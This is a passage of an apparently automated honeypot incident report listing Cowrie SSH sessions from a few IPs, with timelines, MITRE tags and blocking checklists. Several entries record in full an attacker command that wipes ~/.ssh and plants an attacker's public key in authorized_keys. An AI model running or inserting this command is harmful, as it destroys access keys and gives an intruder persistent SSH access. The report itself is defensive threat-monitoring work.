| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 21:39:08` | `cowrie.session.connect` |
| `2026-06-04 21:39:08` | `cowrie.client.version` |
| `2026-06-04 21:39:09` | `cowrie.client.kex` |
| `2026-06-04 21:39:10` | `cowrie.login.success` |
| `2026-06-04 21:39:11` | `cowrie.session.params` |
| `2026-06-04 21:39:11` | `cowrie.command.input` |
| `2026-06-04 21:39:11` | `cowrie.command.failed` |
| `2026-06-04 21:39:11` | `cowrie.log.closed` |
| `2026-06-04 21:39:12` | `cowrie.session.params` |
| `2026-06-04 21:39:12` | `cowrie.command.input` |
| `2026-06-04 21:39:12` | `cowrie.session.file_download` |
| `2026-06-04 21:39:12` | `cowrie.log.closed` |
| `2026-06-04 21:39:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.8.5[.]118` to AbuseIPDB if not already reported
- [ ] Block `189.8.5[.]118` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4aa384fe3cb3

| Field | Detail |
|---|---|
| **Source IP** | `189.8.5[.]118` |
| **First Seen** | 2026-06-04 21:39 |
| **Last Seen** | 2026-06-04 21:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 21:39:16` | `cowrie.session.connect` |
| `2026-06-04 21:39:16` | `cowrie.client.version` |
| `2026-06-04 21:39:16` | `cowrie.client.kex` |
| `2026-06-04 21:39:17` | `cowrie.login.success` |
| `2026-06-04 21:39:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.8.5[.]118` to AbuseIPDB if not already reported
- [ ] Block `189.8.5[.]118` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1f11ac71eeb2

| Field | Detail |
|---|---|
| **Source IP** | `189.8.5[.]118` |
| **First Seen** | 2026-06-04 21:47 |
| **Last Seen** | 2026-06-04 21:48 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 21:47:51` | `cowrie.session.connect` |
| `2026-06-04 21:47:51` | `cowrie.client.version` |
| `2026-06-04 21:47:51` | `cowrie.client.kex` |
| `2026-06-04 21:47:52` | `cowrie.login.success` |
| `2026-06-04 21:47:53` | `cowrie.session.params` |
| `2026-06-04 21:47:53` | `cowrie.command.input` |
| `2026-06-04 21:47:53` | `cowrie.command.failed` |
| `2026-06-04 21:47:54` | `cowrie.log.closed` |
| `2026-06-04 21:47:54` | `cowrie.session.params` |
| `2026-06-04 21:47:54` | `cowrie.command.input` |
| `2026-06-04 21:47:54` | `cowrie.session.file_download` |
| `2026-06-04 21:47:54` | `cowrie.log.closed` |
| `2026-06-04 21:48:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.8.5[.]118` to AbuseIPDB if not already reported
- [ ] Block `189.8.5[.]118` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-04d9c9bf565a

| Field | Detail |
|---|---|
| **Source IP** | `189.8.5[.]118` |
| **First Seen** | 2026-06-04 21:47 |
| **Last Seen** | 2026-06-04 21:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 21:47:58` | `cowrie.session.connect` |
| `2026-06-04 21:47:58` | `cowrie.client.version` |
| `2026-06-04 21:47:58` | `cowrie.client.kex` |
| `2026-06-04 21:47:59` | `cowrie.login.success` |
| `2026-06-04 21:48:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.8.5[.]118` to AbuseIPDB if not already reported
- [ ] Block `189.8.5[.]118` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f382e0804b70

| Field | Detail |
|---|---|
| **Source IP** | `189.8.5[.]118` |
| **First Seen** | 2026-06-04 21:50 |
| **Last Seen** | 2026-06-04 21:50 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 21:50:02` | `cowrie.session.connect` |
| `2026-06-04 21:50:02` | `cowrie.client.version` |
| `2026-06-04 21:50:03` | `cowrie.client.kex` |
| `2026-06-04 21:50:04` | `cowrie.login.success` |
| `2026-06-04 21:50:05` | `cowrie.session.params` |
| `2026-06-04 21:50:05` | `cowrie.command.input` |
| `2026-06-04 21:50:05` | `cowrie.command.failed` |
| `2026-06-04 21:50:05` | `cowrie.log.closed` |
| `2026-06-04 21:50:06` | `cowrie.session.params` |
| `2026-06-04 21:50:06` | `cowrie.command.input` |
| `2026-06-04 21:50:06` | `cowrie.session.file_download` |
| `2026-06-04 21:50:06` | `cowrie.log.closed` |
| `2026-06-04 21:50:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.8.5[.]118` to AbuseIPDB if not already reported
- [ ] Block `189.8.5[.]118` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f106e87b0787

| Field | Detail |
|---|---|
| **Source IP** | `189.8.5[.]118` |
| **First Seen** | 2026-06-04 21:50 |
| **Last Seen** | 2026-06-04 21:50 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 21:50:09` | `cowrie.session.connect` |
| `2026-06-04 21:50:09` | `cowrie.client.version` |
| `2026-06-04 21:50:12` | `cowrie.client.kex` |
| `2026-06-04 21:50:13` | `cowrie.login.success` |
| `2026-06-04 21:50:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.8.5[.]118` to AbuseIPDB if not already reported
- [ ] Block `189.8.5[.]118` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fecd7198d18d

| Field | Detail |
|---|---|
| **Source IP** | `189.8.5[.]118` |
| **First Seen** | 2026-06-04 21:56 |
| **Last Seen** | 2026-06-04 21:56 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 21:56:33` | `cowrie.session.connect` |
| `2026-06-04 21:56:33` | `cowrie.client.version` |
| `2026-06-04 21:56:34` | `cowrie.client.kex` |
| `2026-06-04 21:56:35` | `cowrie.login.success` |
| `2026-06-04 21:56:36` | `cowrie.session.params` |
| `2026-06-04 21:56:36` | `cowrie.command.input` |
| `2026-06-04 21:56:36` | `cowrie.command.failed` |
| `2026-06-04 21:56:36` | `cowrie.log.closed` |
| `2026-06-04 21:56:37` | `cowrie.session.params` |
| `2026-06-04 21:56:37` | `cowrie.command.input` |
| `2026-06-04 21:56:37` | `cowrie.session.file_download` |
| `2026-06-04 21:56:37` | `cowrie.log.closed` |
| `2026-06-04 21:56:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.8.5[.]118` to AbuseIPDB if not already reported
- [ ] Block `189.8.5[.]118` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb6c2bf3bac6

| Field | Detail |
|---|---|
| **Source IP** | `189.8.5[.]118` |
| **First Seen** | 2026-06-04 21:56 |
| **Last Seen** | 2026-06-04 21:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 21:56:40` | `cowrie.session.connect` |
| `2026-06-04 21:56:40` | `cowrie.client.version` |
| `2026-06-04 21:56:41` | `cowrie.client.kex` |
| `2026-06-04 21:56:42` | `cowrie.login.success` |
| `2026-06-04 21:56:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.8.5[.]118` to AbuseIPDB if not already reported
- [ ] Block `189.8.5[.]118` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e16a255ef3c1

| Field | Detail |
|---|---|
| **Source IP** | `189.8.5[.]118` |
| **First Seen** | 2026-06-04 22:00 |
| **Last Seen** | 2026-06-04 22:00 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 22:00:49` | `cowrie.session.connect` |
| `2026-06-04 22:00:49` | `cowrie.client.version` |
| `2026-06-04 22:00:50` | `cowrie.client.kex` |
| `2026-06-04 22:00:51` | `cowrie.login.success` |
| `2026-06-04 22:00:52` | `cowrie.session.params` |
| `2026-06-04 22:00:52` | `cowrie.command.input` |
| `2026-06-04 22:00:52` | `cowrie.command.failed` |
| `2026-06-04 22:00:52` | `cowrie.log.closed` |
| `2026-06-04 22:00:53` | `cowrie.session.params` |
| `2026-06-04 22:00:53` | `cowrie.command.input` |
| `2026-06-04 22:00:53` | `cowrie.session.file_download` |
| `2026-06-04 22:00:53` | `cowrie.log.closed` |
| `2026-06-04 22:00:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.8.5[.]118` to AbuseIPDB if not already reported
- [ ] Block `189.8.5[.]118` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-647bdb694099

| Field | Detail |
|---|---|
| **Source IP** | `189.8.5[.]118` |
| **First Seen** | 2026-06-04 22:00 |
| **Last Seen** | 2026-06-04 22:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 22:00:57` | `cowrie.session.connect` |
| `2026-06-04 22:00:57` | `cowrie.client.version` |
| `2026-06-04 22:00:57` | `cowrie.client.kex` |
| `2026-06-04 22:00:58` | `cowrie.login.success` |
| `2026-06-04 22:00:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.8.5[.]118` to AbuseIPDB if not already reported
- [ ] Block `189.8.5[.]118` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9eb3dbad20f9

| Field | Detail |
|---|---|
| **Source IP** | `189.8.5[.]118` |
| **First Seen** | 2026-06-04 22:07 |
| **Last Seen** | 2026-06-04 22:07 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 22:07:25` | `cowrie.session.connect` |
| `2026-06-04 22:07:25` | `cowrie.client.version` |
| `2026-06-04 22:07:26` | `cowrie.client.kex` |
| `2026-06-04 22:07:27` | `cowrie.login.success` |
| `2026-06-04 22:07:28` | `cowrie.session.params` |
| `2026-06-04 22:07:28` | `cowrie.command.input` |
| `2026-06-04 22:07:28` | `cowrie.command.failed` |
| `2026-06-04 22:07:28` | `cowrie.log.closed` |
| `2026-06-04 22:07:29` | `cowrie.session.params` |
| `2026-06-04 22:07:29` | `cowrie.command.input` |
| `2026-06-04 22:07:29` | `cowrie.session.file_download` |
| `2026-06-04 22:07:29` | `cowrie.log.closed` |
| `2026-06-04 22:07:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.8.5[.]118` to AbuseIPDB if not already reported
- [ ] Block `189.8.5[.]118` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3f3773f22fea

| Field | Detail |
|---|---|
| **Source IP** | `189.8.5[.]118` |
| **First Seen** | 2026-06-04 22:07 |
| **Last Seen** | 2026-06-04 22:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 22:07:32` | `cowrie.session.connect` |
| `2026-06-04 22:07:32` | `cowrie.client.version` |
| `2026-06-04 22:07:33` | `cowrie.client.kex` |
| `2026-06-04 22:07:34` | `cowrie.login.success` |
| `2026-06-04 22:07:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.8.5[.]118` to AbuseIPDB if not already reported
- [ ] Block `189.8.5[.]118` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ffae4ed442fd

| Field | Detail |
|---|---|
| **Source IP** | `189.8.5[.]118` |
| **First Seen** | 2026-06-04 22:09 |
| **Last Seen** | 2026-06-04 22:09 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 22:09:34` | `cowrie.session.connect` |
| `2026-06-04 22:09:34` | `cowrie.client.version` |
| `2026-06-04 22:09:35` | `cowrie.client.kex` |
| `2026-06-04 22:09:36` | `cowrie.login.success` |
| `2026-06-04 22:09:37` | `cowrie.session.params` |
| `2026-06-04 22:09:37` | `cowrie.command.input` |
| `2026-06-04 22:09:37` | `cowrie.command.failed` |
| `2026-06-04 22:09:37` | `cowrie.log.closed` |
| `2026-06-04 22:09:38` | `cowrie.session.params` |
| `2026-06-04 22:09:38` | `cowrie.command.input` |
| `2026-06-04 22:09:38` | `cowrie.session.file_download` |
| `2026-06-04 22:09:38` | `cowrie.log.closed` |
| `2026-06-04 22:09:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.8.5[.]118` to AbuseIPDB if not already reported
- [ ] Block `189.8.5[.]118` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b8465b6b539a

| Field | Detail |
|---|---|
| **Source IP** | `189.8.5[.]118` |
| **First Seen** | 2026-06-04 22:09 |
| **Last Seen** | 2026-06-04 22:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 22:09:42` | `cowrie.session.connect` |
| `2026-06-04 22:09:42` | `cowrie.client.version` |
| `2026-06-04 22:09:42` | `cowrie.client.kex` |
| `2026-06-04 22:09:43` | `cowrie.login.success` |
| `2026-06-04 22:09:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.8.5[.]118` to AbuseIPDB if not already reported
- [ ] Block `189.8.5[.]118` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dfae702de8b7

| Field | Detail |
|---|---|
| **Source IP** | `163.7.4[.]169` |
| **First Seen** | 2026-06-04 23:02 |
| **Last Seen** | 2026-06-04 23:02 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 23:02:29` | `cowrie.session.connect` |
| `2026-06-04 23:02:29` | `cowrie.client.version` |
| `2026-06-04 23:02:29` | `cowrie.client.kex` |
| `2026-06-04 23:02:29` | `cowrie.login.success` |
| `2026-06-04 23:02:29` | `cowrie.session.params` |
| `2026-06-04 23:02:29` | `cowrie.command.input` |
| `2026-06-04 23:02:29` | `cowrie.command.failed` |
| `2026-06-04 23:02:29` | `cowrie.log.closed` |
| `2026-06-04 23:02:29` | `cowrie.session.params` |
| `2026-06-04 23:02:29` | `cowrie.command.input` |
| `2026-06-04 23:02:29` | `cowrie.session.file_download` |
| `2026-06-04 23:02:29` | `cowrie.log.closed` |
| `2026-06-04 23:02:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `163.7.4[.]169` to AbuseIPDB if not already reported
- [ ] Block `163.7.4[.]169` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb0576b1b43c

| Field | Detail |
|---|---|
| **Source IP** | `163.7.4[.]169` |
| **First Seen** | 2026-06-04 23:02 |
| **Last Seen** | 2026-06-04 23:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 23:02:31` | `cowrie.session.connect` |
| `2026-06-04 23:02:31` | `cowrie.client.version` |
| `2026-06-04 23:02:31` | `cowrie.client.kex` |
| `2026-06-04 23:02:31` | `cowrie.login.success` |
| `2026-06-04 23:02:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `163.7.4[.]169` to AbuseIPDB if not already reported
- [ ] Block `163.7.4[.]169` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a6c83504b88

| Field | Detail |
|---|---|
| **Source IP** | `68.220.171[.]40` |
| **First Seen** | 2026-06-04 23:02 |
| **Last Seen** | 2026-06-04 23:03 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 23:02:56` | `cowrie.session.connect` |
| `2026-06-04 23:02:56` | `cowrie.client.version` |
| `2026-06-04 23:02:56` | `cowrie.client.kex` |
| `2026-06-04 23:02:57` | `cowrie.login.success` |
| `2026-06-04 23:02:58` | `cowrie.session.params` |
| `2026-06-04 23:02:58` | `cowrie.command.input` |
| `2026-06-04 23:02:58` | `cowrie.command.failed` |
| `2026-06-04 23:02:58` | `cowrie.log.closed` |
| `2026-06-04 23:02:58` | `cowrie.session.params` |
| `2026-06-04 23:02:58` | `cowrie.command.input` |
| `2026-06-04 23:02:58` | `cowrie.session.file_download` |
| `2026-06-04 23:02:58` | `cowrie.log.closed` |
| `2026-06-04 23:03:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `68.220.171[.]40` to AbuseIPDB if not already reported
- [ ] Block `68.220.171[.]40` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b76a557c8b7

| Field | Detail |
|---|---|
| **Source IP** | `68.220.171[.]40` |
| **First Seen** | 2026-06-04 23:03 |
| **Last Seen** | 2026-06-04 23:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

